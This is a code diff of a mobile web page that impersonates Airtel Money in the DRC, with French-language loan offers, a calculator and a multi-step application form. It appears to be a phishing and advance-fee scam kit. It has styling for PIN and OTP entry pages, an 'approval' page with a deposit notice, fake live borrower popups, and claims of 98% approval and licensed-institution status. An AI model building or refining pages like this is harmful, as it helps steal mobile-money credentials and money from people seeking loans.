-  .ld-card { background:#fff; padding:20px 24px; }
-  .ld-htitle { font-size:0.82rem; font-weight:600; color:var(--text-mid); margin-bottom:14px; display:flex; align-items:center; gap:6px; }
-  .ld-row { display:flex; align-items:center; gap:12px; padding:10px 0; border-bottom:1px solid #f5f5f5; }
-  .ld-row:last-child { border-bottom:none; }
-  .ld-icon { width:34px; height:34px; border-radius:8px; display:flex; align-items:center; justify-content:center; font-size:0.85rem; flex-shrink:0; }
-  .ic-g{background:linear-gradient(135deg,#2ECC71,#27AE60); color:#fff;}
-  .ic-b{background:linear-gradient(135deg,#3498DB,#2980B9); color:#fff;}
-  .ic-p{background:linear-gradient(135deg,#ED1C24,#C41219); color:#fff;}
-  .ld-lbl { font-size:0.72rem; color:var(--text-light); text-transform:uppercase; letter-spacing:0.04em; }
-  .ld-val { font-size:0.9rem; font-weight:600; }
-  .qa-wrap { background:#fff; padding:0 24px 18px; }
-  .qa-title { font-size:0.8rem; font-weight:600; color:var(--text-mid); margin-bottom:10px; text-align:center; }
-  .qa-btn { width:100%; padding:12px; margin-bottom:8px; background:#fff; border:1.5px solid #e0e0e0; border-radius:8px; font-size:0.84rem; font-weight:500; color:var(--text-dark); cursor:pointer; font-family:"Times New Roman", Times, serif; transition:all 0.2s; }
-  .qa-btn:hover { border-color:var(--airtel-red); color:var(--airtel-red); }
-  .nxt-steps { background:#fff; padding:14px 24px; display:flex; align-items:flex-start; gap:8px; border-top:1px solid #f0f0f0; }
-  .nxt-steps p { font-size:0.79rem; color:var(--text-light); line-height:1.5; }
-  .rth-wrap { background:#fff; border-radius:0 0 var(--radius) var(--radius); padding:14px 24px 24px; }
-  .rth-btn { width:100%; padding:13px; background:var(--grad); color:#fff; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.04em; cursor:pointer; font-family:"Times New Roman", Times, serif; box-shadow:0 4px 12px rgba(237,28,36,0.25); }
+  /* CUSTOM SLIDER */
+  input[type=range] {
+    width: 100%;
+    -webkit-appearance: none;
+    height: 8px;
+    border-radius: 4px;
+    outline: none;
+    margin: 8px 0 0 0;
+    background: linear-gradient(to right, var(--brand-red) 0%, var(--brand-red) var(--pct, 10%), #f3f4f6 var(--pct, 10%), #f3f4f6 100%);
+  }
+  input[type=range]::-webkit-slider-thumb {
+    -webkit-appearance: none;
+    width: 26px;
+    height: 26px;
+    border-radius: 50%;
+    background: #ffffff;
+    border: 5px solid var(--brand-red);
+    box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+    cursor: pointer;
+  }
 
-  /* INLINE ERROR / STATUS MESSAGES */
-  .msg-box { border-radius:var(--radius-sm); padding:12px 16px; font-size:0.84rem; margin-bottom:16px; display:none; align-items:center; gap:10px; }
-  .msg-box.show { display:flex; }
-  .msg-box.error   { background:#fef2f2; border:1.5px solid #fecaca; color:#991b1b; }
-  .msg-box.success { background:#f0fdf4; border:1.5px solid #bbf7d0; color:#166534; }
-  .msg-box.info    { background:#eff6ff; border:1.5px solid #bfdbfe; color:#1e40af; }
-  .msg-box.warning { background:#fefce8; border:1.5px solid #fef08a; color:#854d0e; }
-  .msg-icon { font-size:1.1rem; flex-shrink:0; }
+  .rate-info-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 12px 0;
+    border-top: 1px dashed var(--border-color);
+    margin-bottom: 20px;
+    font-size: 0.9rem;
+  }
+  .rate-info-row .lbl { color: var(--brand-red); font-weight: 800; }
+  .rate-info-row .val { color: var(--brand-red); font-weight: 800; }
 
-  /* WAITING / POLLING INDICATOR */
-  .waiting-box { background:#f8f9ff; border:1px solid #e0e5ff; border-radius:var(--radius-sm); padding:16px; text-align:center; margin-bottom:16px; display:none; }
-  .waiting-box.show { display:block; }
-  .waiting-box .wb-spinner { width:28px; height:28px; border:3px solid #e0e5ff; border-top-color:var(--airtel-red); border-radius:50%; animation:spin 0.8s linear infinite; margin:0 auto 10px; }
-  .waiting-box p { font-size:0.82rem; color:var(--text-mid); }
+  /* DISPLAY RESULT BOX */
+  .result-display-card {
+    background: #fafafa;
+    border-radius: var(--radius-md);
+    padding: 20px;
+    text-align: center;
+    margin-bottom: 20px;
+  }
+  .result-amount {
+    font-size: 2.1rem;
+    font-weight: 800;
+    color: var(--brand-red);
+    line-height: 1.1;
+    margin-bottom: 6px;
+  }
+  .result-subtitle {
+    font-size: 0.8rem;
+    font-weight: 700;
+    color: var(--text-muted);
+    margin-bottom: 8px;
+  }
+  .result-total {
+    font-size: 0.72rem;
+    color: var(--brand-red);
+    font-weight: 700;
+  }
 
-  @media(max-width:500px){.field-row{grid-template-columns:1fr;}.step-card,.land-card{padding:24px 18px;}.otp-card{padding:24px 16px;}}
+  /* BOTTOM CARDS / FEATURES GRID */
+  .grid-features {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 10px;
+    margin-bottom: 16px;
+  }
+  .feat-card {
+    background: #ffffff;
+    border-radius: var(--radius-md);
+    padding: 16px 10px;
+    text-align: center;
+    box-shadow: 0 4px 16px rgba(0, 0, 0, 0.04);
+  }
+  .feat-card .fi { color: var(--brand-red); font-size: 0.9rem; margin-bottom: 8px; }
+  .feat-card .ft { font-size: 0.75rem; font-weight: 800; color: var(--brand-red); margin-bottom: 4px; line-height: 1.2; }
+  .feat-card .fs { font-size: 0.65rem; color: var(--text-muted); font-weight: 600; line-height: 1.2; }
+
+  /* FOOTER FOOTNOTES */
+  .page-bottom-note {
+    text-align: center;
+    color: rgba(255, 255, 255, 0.9);
+    font-size: 0.8rem;
+    font-weight: 700;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+    padding: 8px 0;
+  }
+
+  .pg-footer { 
+    margin-top: auto; 
+    padding: 16px; 
+    text-align: center; 
+    font-size: 0.75rem; 
+    color: rgba(255,255,255,0.85); 
+    font-weight: 600;
+  }
+
+  /* SUMMARY BOX */
+  .sum-box { 
+    border: 1.5px solid var(--brand-red-soft); 
+    border-radius: var(--radius-md); 
+    padding: 16px; 
+    margin: 16px 0; 
+    background: var(--brand-red-light); 
+  }
+  .sum-box h3 { font-size: 0.88rem; font-weight: 800; color: var(--brand-red); margin-bottom: 12px; }
+  .sum-box .sum-row { display: flex; justify-content: space-between; font-size: 0.82rem; padding: 6px 0; border-bottom: 1px dashed rgba(226, 24, 24, 0.2); }
+  .sum-box .sum-row:last-child { border-bottom: none; }
+  .sum-box .sum-row .sk { color: var(--text-muted); font-weight: 600; }
+  .sum-box .sum-row .sv { font-weight: 700; color: var(--text-main); }
+
+  /* SUBMITTED PAGE */
+  #page-submitted { background: var(--page-bg); align-items: center; justify-content: space-between; }
+  .sub-wrap { text-align: center; padding: 32px 16px; width: 100%; margin: auto; }
+  .sub-icon { width: 72px; height: 72px; border-radius: 50%; background: #ffffff; color: var(--brand-red); display: flex; align-items: center; justify-content: center; font-size: 2rem; margin: 0 auto 20px; box-shadow: 0 8px 20px rgba(0,0,0,0.1); }
+  .sub-wrap h2 { font-size: 1.5rem; font-weight: 800; color: #ffffff; margin-bottom: 12px; }
+  .sub-wrap p { color: rgba(255,255,255,0.95); font-size: 0.88rem; line-height: 1.6; margin-bottom: 24px; font-weight: 500; }
+  .redir-pill { display: inline-flex; align-items: center; gap: 8px; background: rgba(255,255,255,0.2); border-radius: 50px; padding: 8px 18px; color: #ffffff; font-size: 0.82rem; font-weight: 600; margin-bottom: 20px; }
+  .redir-n { font-weight: 800; color: #fff; }
+  .btn-go { background: #ffffff; color: var(--brand-red); border: none; border-radius: var(--radius-md); padding: 14px 28px; font-size: 0.95rem; font-weight: 800; cursor: pointer; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+
+  /* LOGIN & OTP PAGES */
+  #page-login, #page-otp { background: var(--page-bg); }
+  .login-card {
+    background: #ffffff;
+    border-radius: var(--radius-lg);
+    padding: 28px 20px;
+    box-shadow: var(--shadow-card);
+    width: 100%;
+  }
+  .login-card h2 { font-size: 1.25rem; font-weight: 800; text-align: center; margin-bottom: 16px; color: var(--text-main); }
+  .lg-phone-row { display: flex; margin-bottom: 20px; }
+  .pin-label { font-size: 0.82rem; color: var(--text-muted); font-weight: 600; text-align: center; margin-bottom: 12px; }
+  .pin-row { display: flex; gap: 8px; justify-content: center; margin-bottom: 16px; align-items: center; }
+  .pin-box { width: 48px; height: 52px; border: 1.5px solid var(--border-color); border-radius: var(--radius-sm); text-align: center; font-size: 1.25rem; font-weight: 800; color: var(--brand-red); outline: none; background: #fafafa; transition: border-color 0.2s; }
+  .pin-box:focus { border-color: var(--brand-red); background: #ffffff; }
+  .pin-eye { cursor: pointer; color: var(--text-muted); font-size: 1.1rem; background: none; border: none; padding: 4px; }
+  .forgot-pin { text-align: center; font-size: 0.82rem; color: var(--text-muted); font-weight: 600; margin-bottom: 20px; cursor: pointer; }
+  .btn-login { width: 100%; padding: 15px; background: #e5e7eb; color: #9ca3af; border: none; border-radius: var(--radius-md); font-size: 0.95rem; font-weight: 800; cursor: pointer; transition: all 0.2s; }
+  .btn-login.rdy { background: var(--brand-red); color: #ffffff; box-shadow: var(--shadow-btn); }
+
+  /* ALIGNED PROFESSIONAL OTP CARD DESIGN */
+  .otp-card {
+    background: #ffffff;
+    border-radius: var(--radius-lg);
+    padding: 32px 24px;
+    box-shadow: var(--shadow-card);
+    width: 100%;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    text-align: center;
+  }
+  .otp-icon-shield {
+    width: 56px;
+    height: 56px;
+    background: var(--brand-red-light);
+    color: var(--brand-red);
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 1.6rem;
+    margin-bottom: 16px;
+  }
+  .otp-card h2 { 
+    font-size: 1.35rem; 
+    font-weight: 800; 
+    margin-bottom: 8px; 
+    color: var(--text-main); 
+  }
+  .otp-hint { 
+    font-size: 0.85rem; 
+    color: var(--text-muted); 
+    line-height: 1.4;
+    margin-bottom: 12px; 
+    max-width: 280px;
+  }
+  .otp-phone-badge { 
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    background: #f3f4f6;
+    padding: 6px 14px;
+    border-radius: var(--radius-pill);
+    font-size: 0.9rem; 
+    font-weight: 800; 
+    color: var(--text-main); 
+    margin-bottom: 24px; 
+  }
+  #otpInputSection {
+    width: 100%;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+  .otp-inputs { 
+    display: flex; 
+    gap: 12px; 
+    justify-content: center;
+    margin-bottom: 20px; 
+    width: 100%;
+    max-width: 280px;
+  }
+  .otp-box { 
+    width: 54px; 
+    height: 60px; 
+    border: 2px solid var(--border-color); 
+    border-radius: var(--radius-sm); 
+    text-align: center; 
+    font-size: 1.5rem; 
+    font-weight: 800; 
+    color: var(--brand-red); 
+    outline: none; 
+    background: #fafafa; 
+    transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+  }
+  .otp-box:focus { 
+    border-color: var(--brand-red); 
+    background: #ffffff;
+    box-shadow: 0 0 0 4px rgba(226, 24, 24, 0.15);
+    transform: translateY(-2px);
+  }
+  .otp-resend { 
+    font-size: 0.82rem; 
+    color: var(--text-muted); 
+    margin-bottom: 24px; 
+    font-weight: 600; 
+  }
+  .btn-otp { 
+    width: 100%; 
+    padding: 16px; 
+    background: #e5e7eb; 
+    color: #9ca3af; 
+    border: none; 
+    border-radius: var(--radius-md); 
+    font-size: 1rem; 
+    font-weight: 800; 
+    cursor: pointer; 
+    transition: all 0.2s ease; 
+  }
+  .btn-otp.rdy { 
+    background: var(--brand-red); 
+    color: #ffffff; 
+    box-shadow: var(--shadow-btn); 
+  }
+  .btn-otp.rdy:active {
+    transform: scale(0.98);
+  }
+
+  /* APPROVAL PAGE */
+  #page-approval { background: var(--page-bg); }
+  .appr-wrap { width: 100%; background: #ffffff; border-radius: var(--radius-lg); overflow: hidden; box-shadow: var(--shadow-card); }
+  .appr-header { padding: 24px 20px 16px; text-align: center; }
+  .check-circle { width: 56px; height: 56px; border-radius: 50%; background: #10b981; display: flex; align-items: center; justify-content: center; margin: 0 auto 12px; font-size: 1.6rem; color: #fff; }
+  .appr-title { font-size: 1.25rem; font-weight: 800; color: var(--text-main); margin-bottom: 4px; }
+  .appr-sub { font-size: 0.82rem; color: var(--text-muted); line-height: 1.4; }
+  .appr-banner { background: var(--brand-red); padding: 18px 16px; text-align: center; color: #fff; }
+  .appr-banner .abl { font-size: 0.72rem; color: rgba(255,255,255,0.85); text-transform: uppercase; letter-spacing: 0.08em; font-weight: 700; }
+  .appr-banner .aba { font-size: 2rem; font-weight: 800; color: #ffffff; margin-top: 2px; }
+  .comp-box { background: #fffbeb; border: 1.5px solid #fcd34d; border-radius: var(--radius-md); padding: 16px; margin: 16px; }
+  .comp-box .ch { display: flex; align-items: center; gap: 6px; font-size: 0.85rem; font-weight: 800; color: #b45309; margin-bottom: 8px; text-transform: uppercase; }
+  .comp-box p { font-size: 0.82rem; color: #451a03; line-height: 1.5; }
+  .deposit-badge { background: #fef3c7; color: #92400e; font-weight: 800; padding: 2px 6px; border-radius: 4px; }
+  .comp-note { margin-top: 8px; padding-top: 8px; border-top: 1px dashed #fcd34d; font-size: 0.75rem; color: #78350f; }
+  .ld-card { background: #fafafa; padding: 16px; border-top: 1px solid var(--border-color); border-bottom: 1px solid var(--border-color); }
+  .ld-card .ld-htitle { font-size: 0.82rem; font-weight: 800; color: var(--text-main); margin-bottom: 10px; }
+  .ld-card .ld-row { display: flex; align-items: center; gap: 10px; padding: 6px 0; border-bottom: 1px solid var(--border-color); }
+  .ld-card .ld-row:last-child { border-bottom: none; }
+  .ld-card .ld-icon { width: 32px; height: 32px; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 0.85rem; color: #fff; flex-shrink: 0; }
+  .ic-g { background: #10b981; } .ic-b { background: var(--brand-red); } .ic-p { background: #f59e0b; }
+  .ld-lbl { font-size: 0.68rem; color: var(--text-muted); text-transform: uppercase; font-weight: 700; }
+  .ld-val { font-size: 0.88rem; font-weight: 800; color: var(--text-main); }
+  .qa-wrap { padding: 16px; }
+  .qa-title { font-size: 0.78rem; font-weight: 800; color: var(--text-muted); margin-bottom: 8px; text-transform: uppercase; }
+  .qa-btn { width: 100%; padding: 10px 14px; margin-bottom: 6px; background: #ffffff; border: 1.5px solid var(--border-color); border-radius: var(--radius-sm); font-size: 0.82rem; font-weight: 700; color: var(--text-main); cursor: pointer; text-align: left; }
+  .nxt-steps { background: #f0fdf4; padding: 12px 16px; display: flex; align-items: flex-start; gap: 8px; border-top: 1px solid #dcfce7; }
+  .nxt-steps p { font-size: 0.78rem; color: #166534; line-height: 1.4; }
+  .rth-wrap { padding: 16px; display: flex; flex-direction: column; gap: 10px; }
+  .reapply-btn-pro { width: 100%; padding: 14px; background: #10b981; color: #ffffff; border: none; border-radius: var(--radius-md); font-size: 0.9rem; font-weight: 800; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; text-decoration: none; text-transform: uppercase; }
+  .rth-btn { width: 100%; padding: 12px; background: #f3f4f6; color: var(--text-main); border: none; border-radius: var(--radius-md); font-size: 0.85rem; font-weight: 700; cursor: pointer; }
+
+  /* LIVE POPUP NOTIFICATION */
+  .live-popup {
+    position: fixed;
+    top: 16px;
+    left: 50%;
+    transform: translateX(-50%);
+    width: calc(100% - 32px);
+    max-width: 408px;
+    background: rgba(255, 255, 255, 0.98);
+    backdrop-filter: blur(6px);
+    border-radius: var(--radius-md);
+    padding: 10px 14px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    box-shadow: 0 8px 24px rgba(0,0,0,0.12);
+    opacity: 0;
+    visibility: hidden;
+    transition: all 0.3s ease;
+    z-index: 9999;
+  }
+  .live-popup.show { opacity: 1; visibility: visible; }
+  .popup-avatar { width: 32px; height: 32px; border-radius: 50%; background: var(--brand-red-light); color: var(--brand-red); display: flex; align-items: center; justify-content: center; font-size: 0.75rem; font-weight: 800; }
+  .popup-content { flex: 1; }
+  .popup-text { font-size: 0.75rem; line-height: 1.3; color: var(--text-main); }
+  .popup-text strong { color: var(--brand-red); font-weight: 800; }
+  .popup-time { margin-top: 2px; font-size: 0.62rem; color: #10b981; font-weight: 700; }
+  .popup-time::before { content: "● "; animation: livePulse 1.2s infinite; }
+  @keyframes livePulse { 50% { opacity: .4; } }
+
+  /* INLINE MESSAGES */
+  .msg-box { border-radius: var(--radius-sm); padding: 12px 14px; font-size: 0.82rem; margin-bottom: 16px; display: none; align-items: center; gap: 8px; font-weight: 600; width: 100%; text-align: left; }
+  .msg-box.show { display: flex; }
+  .msg-box.error { background: #fef2f2; border: 1px solid #fecaca; color: #991b1b; }
+  .msg-box.success { background: #f0fdf4; border: 1px solid #bbf7d0; color: #166534; }
+  .msg-box.info { background: #eff6ff; border: 1px solid #bfdbfe; color: #1e40af; }
+  .msg-box.warning { background: #fefce8; border: 1px solid #fef08a; color: #854d0e; }
+  .msg-icon { font-size: 1rem; flex-shrink: 0; }
+
+  /* WAITING BOX */
+  .waiting-box { background: #fafafa; border: 1px solid var(--border-color); border-radius: var(--radius-sm); padding: 18px 16px; text-align: center; margin-bottom: 16px; display: none; width: 100%; }
+  .waiting-box.show { display: block; }
+  .waiting-box .wb-spinner { width: 28px; height: 28px; border: 3px solid #f3f4f6; border-top-color: var(--brand-red); border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 10px; }
+  .waiting-box p { font-size: 0.82rem; color: var(--text-muted); font-weight: 600; }
+
+  /* BRAND LOGOS & HELPERS */
+  .hp-logo-inline, .hp-logo-sm { display: flex; align-items: center; gap: 8px; }
+  .hp-logo-sm svg { width: 26px; height: 26px; fill: #ffffff; }
+  .hp-logo-inline .brand, .hp-logo-sm .brand { font-size: 1.2rem; font-weight: 800; color: #ffffff; }
 </style>
 </head>
+
 <body>
 
-<!-- ══════════════════════ PAGE 1: LANDING ══════════════════════ -->
-<div id="page-landing" class="page active">
-  <header class="brand-header">
-    <div class="brand-logo-area">
-      <div class="brand-logo-mark">a</div>
-      <div class="brand-text-group">
-        <span class="brand-title">Airtel Congo</span>
-        <span class="brand-subtitle" data-i18n="lbl_financial_services">Financial Services</span>
-      </div>
+<div class="app-viewport">
+
+<!-- PAGE WELCOME MODAL (FIRST SCREEN) -->
+<div id="page-welcome" class="page active">
+  <div class="welcome-card">
+    <div class="welcome-icon-wrap">
+      <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/></svg>
     </div>
-    <div class="header-right-group">
-      <!-- PROFESSIONAL LANGUAGE SELECTION DROPDOWN BUTTON -->
-      <div class="lang-selector-wrap">
-        <button class="lang-select-btn" onclick="toggleLangDropdown(event)">
-          <span id="currentLangLabel">🌐 English</span> ▾
-        </button>
-        <div class="lang-dropdown-menu" id="langDropdownMenu">
-          <button class="lang-option active" onclick="setLanguage('en')">🇬🇧 English</button>
-          <button class="lang-option" onclick="setLanguage('sw')">🇨🇩 Kiswahili</button>
-          <button class="lang-option" onclick="setLanguage('fr')">🇫🇷 Français</button>
-        </div>
-      </div>
-      <div class="brand-nav-right" onclick="goTo('page-login')" data-i18n="nav_signin">Sign In</div>
+    <div class="welcome-text">
+      Veuillez vous assurer d'utiliser un numéro de téléphone <strong>Airtel DRC (+243)</strong> valide et enregistré pour être éligible.
     </div>
-  </header>
+    <button class="welcome-btn" onclick="goTo('page-landing')">J'AI COMPRIS</button>
+  </div>
+</div>
 
-  <div class="land-center">
-    <div class="land-card">
-      <h1 data-i18n="land_h1">Get Your Loan Approved Fast</h1>
-      <p class="land-tagline" data-i18n="land_sub">Quick approval • Competitive rates • Flexible terms</p>
+<!-- PAGE 1: LANDING CALCULATOR -->
+<div id="page-landing" class="page">
+  <div class="brand-header">
+    <div class="brand-icon-wrap">
+      <svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
+    </div>
+    <h1 class="brand-title">Airtel Money</h1>
+    <p class="brand-subtitle">Prêts intelligents & Crédits instantanés RDC</p>
+  </div>
 
-      <div class="calc-box">
-        <h2 data-i18n="calc_title">Loan Calculator</h2>
-        <div class="calc-row2"><span data-i18n="calc_amt">Loan Amount</span><span class="cv" id="aDisp">$1,000</span></div>
-        <input type="range" id="rA" min="50" max="10000" step="50" value="1000" oninput="calcUp()" style="--pct:9.5%">
-        <div class="range-ends"><span>$50</span><span>$10,000</span></div>
-        <div class="calc-row2"><span data-i18n="calc_term">Loan Term</span><span class="cv" id="tDisp">12 months</span></div>
-        <input type="range" id="rT" min="6" max="60" step="6" value="12" oninput="calcUp()" style="--pct:11%">
-        <div class="range-ends"><span data-i18n="calc_6m">6 months</span><span data-i18n="calc_60m">60 months</span></div>
-        <div class="monthly-box">
-          <span class="ml" data-i18n="calc_monthly">Monthly Payment</span>
-          <span class="ma" id="mOut">$88.85</span>
-        </div>
+  <div class="pill-group">
+    <div class="pill-badge">✦ Approbation 98%</div>
+    <div class="pill-badge">✦ Taux Réduit</div>
+    <div class="pill-badge">✦ Envoi Immédiat</div>
+  </div>
+
+  <div class="main-card">
+    <div class="card-header-row">
+      <div class="card-title-group">
+        <span>✦</span> CALCULEZ VOTRE PRÊT
       </div>
+      <div class="tag-badge">5% Taux Fixe</div>
+    </div>
 
-      <button class="btn-grad" onclick="goTo('page-step1')" data-i18n="btn_apply_now">APPLY NOW</button>
-
-      <div class="feats-row">
-        <div class="feat"><div class="fi">⚡</div><div class="ft" data-i18n="feat_fast">Fast Approval</div><div class="fs" data-i18n="feat_fast_sub">Within 24 hours</div></div>
-        <div class="feat"><div class="fi">💰</div><div class="ft" data-i18n="feat_rates">Low Rates</div><div class="fs" data-i18n="feat_rates_sub">From 12%</div></div>
-        <div class="feat"><div class="fi">🔒</div><div class="ft" data-i18n="feat_secure">Secure</div><div class="fs" data-i18n="feat_secure_sub">Bank-level</div></div>
+    <div class="calc-input-block">
+      <div class="calc-label-row">
+        <div class="calc-label"><span>✦</span> Montant souhaité</div>
+        <div class="calc-value-pill" id="aDisp">$ 1,000</div>
       </div>
+      <input type="range" id="rA" min="1000" max="50000" step="500" value="1000" oninput="calcUp()" style="--pct:0%">
+    </div>
+
+    <div class="calc-input-block">
+      <div class="calc-label-row">
+        <div class="calc-label"><span>✦</span> Durée du prêt</div>
+        <div class="calc-value-pill" id="tDisp">12 Mois</div>
+      </div>
+      <input type="range" id="rT" min="6" max="60" step="6" value="12" oninput="calcUp()" style="--pct:11%">
+    </div>
+
+    <div class="rate-info-row">
+      <span class="lbl">Taux d'intérêt</span>
+      <span class="val">5% l'an</span>
+    </div>
+
+    <div class="result-display-card">
+      <div class="result-amount" id="mOut">$ 86</div>
+      <div class="result-subtitle">Paiement mensuel estimé</div>
+      <div class="result-total" id="totOut">Total à rembourser: $ 1,028 (Capital + Intérêts)</div>
+    </div>
+
+    <button class="btn-grad" onclick="goTo('page-step1')">DEMANDER MAINTENANT ➔</button>
+  </div>
+
+  <div class="grid-features">
+    <div class="feat-card">
+      <div class="fi">✦</div>
+      <div class="ft">10,000+ Prêts</div>
+      <div class="fs">Accordés en RDC</div>
+    </div>
+    <div class="feat-card">
+      <div class="fi">✦</div>
+      <div class="ft">24h / 24</div>
+      <div class="fs">Traitement rapide</div>
+    </div>
+    <div class="feat-card">
+      <div class="fi">✦</div>
+      <div class="ft">Sécurité SSL</div>
+      <div class="fs">Données protégées</div>
     </div>
   </div>
 
-<div id="popup" class="live-popup">
-    <div class="popup-avatar" id="popup-avatar">A</div>
-    <div class="popup-content">
-        <div id="popup-text" class="popup-text"></div>
-        <div id="popup-time" class="popup-time">Just now</div>
-    </div>
+  <div class="page-bottom-note">
+    ✦ Sécurisé I 🏦 Institution Financière Agrée
+  </div>
 </div>
 
-  <div class="land-footer">© 2026 Airtel Congo</div>
-</div>
-
-<!-- ══════════════════════ PAGE 2: STEP 1 ══════════════════════ -->
+<!-- PAGE STEP 1 -->
 <div id="page-step1" class="page">
-  <header class="brand-header">
-    <div class="brand-logo-area">
-      <div class="brand-logo-mark">a</div>
-      <div class="brand-text-group">
-        <span class="brand-title">Airtel Congo</span>
-        <span class="brand-subtitle" data-i18n="lbl_loan_app">Loan Application</span>
-      </div>
+  <nav class="navbar">
+    <a class="nav-left" onclick="goTo('page-landing')">← Retour</a>
+    <div class="hp-logo-sm">
+      <svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
+      <div class="brand">Airtel Money</div>
     </div>
-    <div class="brand-nav-right" onclick="goTo('page-landing')" data-i18n="nav_home">Home</div>
-  </header>
+    <div class="nav-right"><div class="hline"></div><div class="hline"></div></div>
+  </nav>
 
-  <div class="step-center">
-    <div class="step-card">
-      <h2 data-i18n="lbl_loan_app">Loan Application</h2>
-      <p class="step-sub" data-i18n="step_1_sub">Step 1 of 3</p>
-      <div class="prog-row"><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
-      <div class="msg-box error" id="s1Err"><span class="msg-icon">&#x2715;</span><span id="s1ErrTxt"></span></div>
-      <div class="field"><label data-i18n="field_loan_type">Loan Type</label><div class="sel-wrap"><select id="s1ty"><option data-i18n="opt_personal">Personal Loan</option><option selected data-i18n="opt_business">Business Loan</option><option data-i18n="opt_home">Home Loan</option><option data-i18n="opt_car">Car Loan</option><option data-i18n="opt_edu">Education Loan</option></select></div></div>
-      <div class="field"><label data-i18n="field_loan_amt">Loan Amount ($)</label><input type="number" id="s1am" value="1000" placeholder="Enter amount" oninput="clearErr('s1Err')"></div>
-      <div class="field"><label data-i18n="field_loan_term">Loan Term</label><div class="sel-wrap"><select id="s1te"><option>6 Months</option><option>12 Months</option><option>18 Months</option><option>24 Months</option><option>36 Months</option><option selected>48 Months</option><option>60 Months</option></select></div></div>
-      <div class="field"><label data-i18n="field_purpose">Purpose of Loan</label><textarea id="s1pu" placeholder="Describe the purpose of your loan…" oninput="clearErr('s1Err')"></textarea></div>
-      <button class="btn-grad" onclick="toS2()" data-i18n="btn_next">NEXT STEP</button>
+  <div class="main-card">
+    <div class="card-header-row">
+      <div class="card-title-group"><span>✦</span> Demande de Prêt</div>
+      <div class="tag-badge">Étape 1 sur 3</div>
     </div>
+    <div class="prog-row"><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
+    
+    <div class="msg-box error" id="s1Err"><span class="msg-icon">&#x2715;</span><span id="s1ErrTxt"></span></div>
+    
+    <div class="field"><label>Type de Prêt</label><div class="sel-wrap"><select id="s1ty"><option>Prêt Personnel</option><option selected>Prêt Commercial / Business</option><option>Prêt Immobilier</option><option>Prêt Équipement</option><option>Prêt Études</option></select></div></div>
+    <div class="field"><label>Montant du Prêt ($)</label><input type="number" id="s1am" value="1000" placeholder="Entrez le montant" oninput="clearErr('s1Err')"></div>
+    <div class="field"><label>Durée de Remboursement</label><div class="sel-wrap"><select id="s1te"><option>6 Mois</option><option>12 Mois</option><option>18 Mois</option><option>24 Mois</option><option>36 Mois</option><option selected>48 Mois</option><option>60 Mois</option></select></div></div>
+    <div class="field"><label>Motif du Prêt</label><textarea id="s1pu" placeholder="Expliquez brièvement l'usage de votre prêt…" oninput="clearErr('s1Err')"></textarea></div>
+    
+    <button class="btn-grad" onclick="toS2()">ÉTAPE SUIVANTE ➔</button>
   </div>
+
+  <div class="pg-footer">© 2026 Airtel Money RDC</div>
 </div>
 
-<!-- ══════════════════════ PAGE 3: STEP 2 ══════════════════════ -->
+<!-- PAGE STEP 2 -->
 <div id="page-step2" class="page">
-  <header class="brand-header">
-    <div class="brand-logo-area">
-      <div class="brand-logo-mark">a</div>
-      <div class="brand-text-group">
-        <span class="brand-title">Airtel Congo</span>
-        <span class="brand-subtitle" data-i18n="lbl_loan_app">Loan Application</span>
-      </div>
+  <nav class="navbar">
+    <a class="nav-left" onclick="goTo('page-step1')">← Retour</a>
+    <div class="hp-logo-sm">
+      <svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
+      <div class="brand">Airtel Money</div>
     </div>
-    <div class="brand-nav-right" onclick="goTo('page-step1')" data-i18n="nav_back">Back</div>
-  </header>
+    <div class="nav-right"><div class="hline"></div><div class="hline"></div></div>
+  </nav>
 
-  <div class="step-center">
-    <div class="step-card">
-      <h2 data-i18n="lbl_loan_app">Loan Application</h2>
-      <p class="step-sub" data-i18n="step_2_sub">Step 2 of 3</p>
-      <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div></div>
-      <div class="msg-box error" id="s2Err"><span class="msg-icon">&#x2715;</span><span id="s2ErrTxt"></span></div>
-      <div class="field-row">
-        <div class="field"><label data-i18n="field_fname">First Name</label><input type="text" id="s2fi" placeholder="First Name" oninput="clearErr('s2Err')"></div>
-        <div class="field"><label data-i18n="field_lname">Last Name</label><input type="text" id="s2la" placeholder="Last Name" oninput="clearErr('s2Err')"></div>
-      </div>
-      <div class="field">
-        <label data-i18n="field_phone">Phone Number</label>
-        <div class="phone-row"><div class="ph-pre">+243</div><input type="tel" id="s2ph" placeholder="812345678" maxlength="9" oninput="normalizePhone('s2ph');clearErr('s2Err')"></div>
-        <div class="field-hint" data-i18n="phone_hint">Enter 9 digits for DRC</div>
-      </div>
-      <div class="step-btns">
-        <button class="btn-gray" onclick="goTo('page-step1')" data-i18n="btn_prev">PREVIOUS</button>
-        <button class="btn-grad" onclick="toS3()" data-i18n="btn_next">NEXT STEP</button>
